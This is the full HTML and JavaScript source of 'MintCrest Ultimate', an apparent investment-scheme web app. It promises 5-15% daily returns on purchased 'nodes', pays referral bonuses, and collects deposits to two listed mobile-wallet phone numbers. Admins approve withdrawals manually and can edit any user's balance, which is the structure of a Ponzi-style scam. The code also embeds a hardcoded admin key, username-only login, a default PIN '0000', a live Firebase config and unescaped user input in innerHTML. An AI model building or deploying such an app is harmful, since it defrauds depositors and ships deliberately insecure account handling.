<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Ultimate | Control Edition</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;600;700&display=swap');
        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Space Grotesk', sans-serif; }
        body { background: #000; color: #fff; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
        .glass { background: rgba(255, 255, 255, 0.03); backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 1.5rem; }
        .page-container { flex: 1; overflow-y: auto; padding-bottom: 100px; }
        .page { display: none; padding: 20px; animation: fadeIn 0.3s ease; }
        .active-page { display: block; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .active-nav { color: #3b82f6; transform: scale(1.1); text-shadow: 0 0 10px #3b82f6; }
        input { background: rgba(255,255,255,0.05) !important; border: 1px solid rgba(255,255,255,0.1) !important; color: white !important; border-radius: 12px !important; }
    </style>
</head>
<body>

    <div id="notice-bar" class="bg-blue-600 py-1 text-[9px] font-bold text-center uppercase tracking-widest z-[3000]">
        <span id="notice-text">System Core Online | Verified Nodes</span>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[4000] bg-black flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <h1 onclick="adminTap()" class="text-4xl font-bold mb-10 italic">MINT<span class="text-blue-500">CREST</span></h1>
            <div class="glass p-8 border-t-2 border-blue-600">
                <input type="text" id="user-name" placeholder="USERNAME" class="w-full p-4 mb-4 text-center font-bold uppercase outline-none">
                <input type="text" id="ref-by" placeholder="REFERRAL ID (IF ANY)" class="w-full p-4 mb-6 text-center text-[10px] uppercase outline-none">
                <button onclick="login()" class="w-full bg-blue-600 p-4 rounded-xl font-bold uppercase text-xs tracking-widest active:scale-95">Enter Terminal</button>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden page-container">
        <div id="p-home" class="page active-page">
            <div class="glass p-8 mb-6 border-l-8 border-blue-500 shadow-2xl">
                <p class="text-[10px] text-blue-400 font-bold uppercase mb-1">Available Liquidity</p>
                <h2 class="text-5xl font-bold tracking-tighter" id="v-bal">₨ 0</h2>
                <div class="mt-6 flex gap-2">
                    <button onclick="claimGift()" class="flex-1 bg-white/5 p-3 rounded-xl text-[9px] font-bold uppercase border border-white/10">🎁 Claim Gift</button>
                    <div id="timer-box" class="flex-1 bg-blue-500/10 p-3 rounded-xl text-center hidden"><div id="countdown" class="text-xs font-bold text-yellow-500 font-mono">00:00:00</div></div>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-6">
                <button onclick="changePage('wallet')" class="glass p-6 text-center">📥<br><span class="text-[10px] font-bold uppercase mt-2 block">Deposit</span></button>
                <button onclick="changePage('withdraw')" class="glass p-6 text-center text-red-500">📤<br><span class="text-[10px] font-bold uppercase mt-2 block">Withdraw</span></button>
            </div>

            <div class="glass p-5 text-center"><p class="text-[9px] text-gray-500 uppercase font-bold mb-1">Invite Friend (Bonus: ₨ 50)</p><p id="share-id" class="text-xs font-bold text-blue-400 uppercase">---</p></div>
        </div>

        <div id="p-invest" class="page"><h3 class="text-center font-bold mb-6 italic opacity-50 uppercase">Operational Nodes</h3><div id="plans-list" class="space-y-3"></div></div>

        <div id="p-activity" class="page"><h3 class="text-center font-bold mb-6 italic opacity-50 uppercase">Transaction Records</h3><div id="user-history" class="space-y-2"></div></div>

        <div id="p-support" class="page text-center">
            <div class="bg-blue-600 p-10 rounded-[2.5rem] mb-6"><h3 class="font-bold text-xl mb-4">Official Community</h3><a href="https://chat.whatsapp.com/GTV140" class="bg-white text-blue-600 px-8 py-3 rounded-full font-bold uppercase text-[10px]">Join Group</a></div>
            <button onclick="logout()" class="w-full glass p-4 text-red-500 font-bold text-xs uppercase">Logout Session ⏻</button>
        </div>

        <div id="p-wallet" class="page"><div class="glass p-8"><h3 class="text-center font-bold text-blue-400 mb-6 uppercase">Inject Funds</h3><div class="bg-white/5 p-4 rounded-xl mb-6 text-center text-[10px]">EP: 03379827882 | JC: 03705519562</div><input type="number" id="dep-amt" placeholder="AMOUNT" class="w-full p-4 mb-4 text-center"><input type="text" id="dep-tid" placeholder="TRANSACTION TID" class="w-full p-4 mb-6 text-center uppercase"><button onclick="submitDep()" class="w-full bg-blue-600 p-4 rounded-xl font-bold uppercase text-xs">Verify</button></div></div>
        <div id="p-withdraw" class="page"><div class="glass p-8"><h3 class="text-center font-bold text-red-500 mb-6 uppercase">Extraction</h3><input type="number" id="wd-amt" placeholder="MIN 100" class="w-full p-4 mb-4 text-center"><input type="text" id="wd-det" placeholder="AC DETAILS" class="w-full p-4 mb-4 text-center"><input type="password" id="wd-pin" placeholder="SECURITY PIN (Default 0000)" class="w-full p-4 mb-6 text-center"><button onclick="submitWd()" class="w-full bg-red-600 p-4 rounded-xl font-bold uppercase text-xs">Confirm</button></div></div>
    </main>

    <div id="adm-panel" class="fixed inset-0 bg-black z-[5000] p-6 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-8"><h2 class="font-bold text-blue-500 italic">MASTER TERMINAL</h2><button onclick="closeAdm()" class="text-red-500 text-xs font-bold">EXIT</button></div>
        <div class="glass p-5 mb-6"><h4 class="text-[10px] font-bold mb-4 opacity-50 uppercase tracking-widest">Global Broadcast</h4><input type="text" id="adm-msg" placeholder="SYSTEM MESSAGE" class="w-full p-3 text-xs mb-2"><button onclick="updateMsg()" class="w-full bg-blue-600 p-2 rounded-xl text-[10px] font-bold">UPDATE NOTICE</button></div>
        <div class="glass p-5 mb-6"><h4 class="text-[10px] font-bold mb-4 opacity-50 uppercase tracking-widest">User Adjust</h4><input type="text" id="adm-uid" placeholder="USER ID" class="w-full p-3 text-xs mb-2 uppercase"><input type="number" id="adm-val" placeholder="AMOUNT" class="w-full p-3 text-xs mb-4"><div class="grid grid-cols-2 gap-2"><button onclick="editBal('add')" class="bg-green-600 p-2 rounded-xl text-[9px] font-bold">ADD</button><button onclick="editBal('rem')" class="bg-red-600 p-2 rounded-xl text-[9px] font-bold">SUB</button></div></div>
        <h3 class="text-sm font-bold mb-4 uppercase italic text-yellow-500">Pending Requests Pool</h3>
        <div id="adm-req-list" class="space-y-2 pb-20"></div>
    </div>

    <nav id="bottom-nav" class="hidden glass mx-6 my-4 p-4 flex justify-around items-center fixed bottom-0 left-0 right-0 z-[3000] bg-black/80">
        <button onclick="changePage('home')" id="n-home" class="active-nav text-2xl transition-all">🏠</button>
        <button onclick="changePage('invest')" id="n-invest" class="text-2xl">⚡</button>
        <button onclick="changePage('activity')" id="n-activity" class="text-2xl">📜</button>
        <button onclick="changePage('support')" id="n-support" class="text-2xl">⚙️</button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        
        let user = null, tCount = 0, timerInt = null;
        const plans = []; for(let i=1; i<=25; i++) { let prc = (i<=10)?i*100:(i-10)*2000; plans.push({ id:`p${i}`, n: i<=10?"Starter":"Elite", p: prc, r: 5+(i*0.4) }); }

        async function login() {
            const name = document.getElementById('user-name').value.trim().toUpperCase();
            const refID = document.getElementById('ref-by').value.trim().toUpperCase();
            if(!name) return;
            const ref = db.collection("users").doc(name);
            const doc = await ref.get();
            if(!doc.exists) { 
                await ref.set({ name: name, balance: 0, activePlanId: null, lastReq: Date.now(), referredBy: refID || null, lastGift: 0, pin: "0000" }); 
                if(refID && refID !== name) {
                    const rDoc = await db.collection("users").doc(refID).get();
                    if(rDoc.exists) await db.collection("requests").add({ user: refID, amount: 50, type: "REFERRAL BONUS", status: "pending", time: Date.now() });
                }
            }
            localStorage.setItem('mc_auth', name);
            ref.onSnapshot(d => { user = d.data(); if(user) { 
                document.getElementById('v-bal').innerText = "₨ " + (user.balance||0).toLocaleString();
                document.getElementById('share-id').innerText = user.name;
                renderPlans(); startClock(); checkProfit(); 
            } });
            document.getElementById('auth-ui').classList.add('hidden'); document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            syncHist(); syncNotice();
        }

        function renderPlans() {
            const l = document.getElementById('plans-list'); l.innerHTML = '';
            plans.forEach(p => {
                const isOwned = user.activePlanId === p.id;
                l.innerHTML += `<div onclick="${isOwned?'':`buyNode(${p.p},'${p.id}',${p.r})`}" class="glass p-6 flex justify-between items-center ${isOwned?'border-blue-500 border-2 bg-blue-500/10':''}"><div><h4 class="font-bold text-[10px] uppercase text-blue-400">${p.n} Node ${p.id.substring(1)}</h4><p class="text-[8px] text-gray-500">${p.r.toFixed(1)}% Daily</p></div><div class="font-bold text-lg">₨ ${p.p.toLocaleString()}</div></div>`;
            });
        }

        async function claimGift() {
            const now = Date.now();
            if(now - (user.lastGift || 0) < 86400000) return alert("Come back tomorrow, sweetie!");
            await db.collection("requests").add({ user: user.name, amount: "PENDING", type: "GIFT REQUEST", status: "pending", time: now });
            await db.collection("users").doc(user.name).update({ lastGift: now });
            alert("Request sent to Admin!");
        }

        async function buyNode(p, id, r) { if(user.balance < p) return alert("Low balance!"); await db.collection("users").doc(user.name).update({ balance: user.balance-p, activePlanId: id, dailyRate: r, lastPrice: p, lastReq: Date.now() }); alert("Node Active!"); }
        async function submitDep() { const a = document.getElementById('dep-amt').value, t = document.getElementById('dep-tid').value; if(!a||!t) return alert("Fill all!"); await db.collection("requests").add({ user: user.name, amount: parseInt(a), tid: t, type: "DEPOSIT", status: "pending", time: Date.now() }); alert("Sent!"); changePage('home'); }
        async function submitWd() { const a = parseInt(document.getElementById('wd-amt').value), d = document.getElementById('wd-det').value, p = document.getElementById('wd-pin').value; if(a < 100 || user.balance < a) return alert("Check balance/limit!"); if(p !== user.pin) return alert("Wrong PIN!"); await db.collection("requests").add({ user: user.name, amount: a, details: d, type: "WITHDRAW", status: "pending", time: Date.now() }); await db.collection("users").doc(user.name).update({ balance: user.balance - a }); alert("Requested!"); changePage('home'); }

        function syncHist() { db.collection("requests").where("user", "==", user.name).orderBy("time", "desc").onSnapshot(snap => { const l = document.getElementById('user-history'); l.innerHTML = ''; snap.forEach(d => { const r = d.data(); l.innerHTML += `<div class="glass p-4 flex justify-between items-center text-[10px] font-bold uppercase mb-1"><div>${r.type}<br><span class="opacity-25 text-[7px]">${new Date(r.time).toLocaleTimeString()}</span></div><div class="text-right">₨ ${r.amount}<br><span class="${r.status==='approved'?'text-green-500':'text-yellow-500'} text-[8px]">${r.status}</span></div></div>`; }); }); }
        
        function adminTap() { tCount++; if(tCount>=5) { if(prompt("Key:")==="mint786") { document.getElementById('adm-panel').classList.remove('hidden'); syncAdm(); } tCount=0; } }
        function closeAdm() { document.getElementById('adm-panel').classList.add('hidden'); }
        function syncAdm() { db.collection("requests").where("status","==","pending").onSnapshot(snap => { const l = document.getElementById('adm-req-list'); l.innerHTML = ''; snap.forEach(doc => { const d = doc.data(); l.innerHTML += `<div class="glass p-4 text-[10px] mb-2 flex justify-between items-center border-l-4 border-yellow-500"><div>${d.user}<br>${d.type} - ${d.amount}</div><button onclick="approveReq('${doc.id}','${d.user}','${d.amount}')" class="bg-green-600 px-4 py-2 rounded-xl text-[8px] font-bold">APPROVE</button></div>`; }); }); }
        async function approveReq(id, u, amt) { let actualAmt = (amt === "PENDING") ? prompt("Enter Gift Amount:") : amt; if(!actualAmt) return; const ref = db.collection("users").doc(u); const d = (await ref.get()).data(); await ref.update({ balance: (d.balance||0) + parseInt(actualAmt) }); await db.collection("requests").doc(id).update({ status: 'approved', amount: parseInt(actualAmt) }); alert("Done!"); }
        async function editBal(act) { const u = document.getElementById('adm-uid').value.toUpperCase(), v = parseInt(document.getElementById('adm-val').value); const ref = db.collection("users").doc(u); const d = (await ref.get()).data(); await ref.update({ balance: act==='add'?(d.balance+v):(d.balance-v) }); alert("Updated!"); }
        async function updateMsg() { const m = document.getElementById('adm-msg').value; await db.collection("settings").doc("broadcast").set({ msg: m }); alert("Updated!"); }
        
        function syncNotice() { db.collection("settings").doc("broadcast").onSnapshot(d => { if(d.exists) document.getElementById('notice-text').innerText = d.data().msg; }); }
        function logout() { localStorage.removeItem('mc_auth'); location.reload(); }
        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.getElementById('p-'+p).classList.add('active-page'); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-nav')); document.getElementById('n-'+p)?.classList.add('active-nav'); }
        async function checkProfit() { if(!user.activePlanId || Date.now() - user.lastReq < 86400000) return; const amt = Math.floor((user.dailyRate/100)*user.lastPrice); await db.collection("requests").add({ user: user.name, amount: amt, type: "NODE PROFIT", status: "pending", time: Date.now() }); await db.collection("users").doc(user.name).update({ lastReq: Date.now() }); }
        function startClock() { if(!user.activePlanId) return; document.getElementById('timer-box').classList.remove('hidden'); if(timerInt) clearInterval(timerInt); timerInt = setInterval(() => { const diff = (user.lastReq + 86400000) - Date.now(); const cd = document.getElementById('countdown'); if(diff <= 0) { cd.innerText = "READY!"; return; } const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000); cd.innerText = `${String(h).padStart(2,'0')}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`; }, 1000); }
        window.onload = () => { const s = localStorage.getItem('mc_auth'); if(s) { document.getElementById('user-name').value = s; login(); } };
    </script>
</body>
</html>
